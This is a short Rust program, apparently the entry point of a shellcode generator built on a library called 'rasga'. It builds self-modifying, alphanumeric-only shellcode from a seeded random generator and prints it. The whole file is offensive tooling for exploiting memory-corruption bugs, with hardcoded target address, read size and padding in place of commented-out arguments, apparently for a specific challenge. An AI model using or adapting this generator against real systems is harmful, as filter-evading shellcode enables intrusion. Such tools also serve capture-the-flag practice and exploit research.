use clap::*;

use rasga::prelude::*;

#[derive(Parser)]
#[command(version, about, long_about = None)]
struct Args {
    /// The address to write your shellcode at.
    #[arg(short, long)]
    target: u32,

    /// The size of read() to set.
    #[arg(short, long)]
    size: u32,

    /// The size of the shellcode to set.
    #[arg(short, long)]
    padding_size: u32,
}

fn main() {
    // let args = Args::parse();

    let mut prng = StdRng::seed_from_u64(0);
    let mut state = State::default();
    state.marker = prng.random_range(1..=9);
    state.x = get_random_alphanumeric_offset_char(&mut prng, 0x01);

    let mut svc_part = build_svc_part(&mut prng, &state, 0x80);

    let self_modifying = build_self_modifying_part(
        &mut prng,
        &mut svc_part,
        &mut state,
        // args.target,
        // args.size,
        // args.padding_size,
        0x70776000,
        0x200,
        0x110,
    );

    let mut output = Shellcode::default();
    output.check_alphanumeric = true;

    output.cat(&self_modifying);
    output.cat(&svc_part);

    match String::try_from(&output) {
        Ok(s) => {
            println!("{}", s);
        },
        Err(e) => {
            println!("{}", e);
        }
    }

    output.is_alphanumeric().unwrap();
}
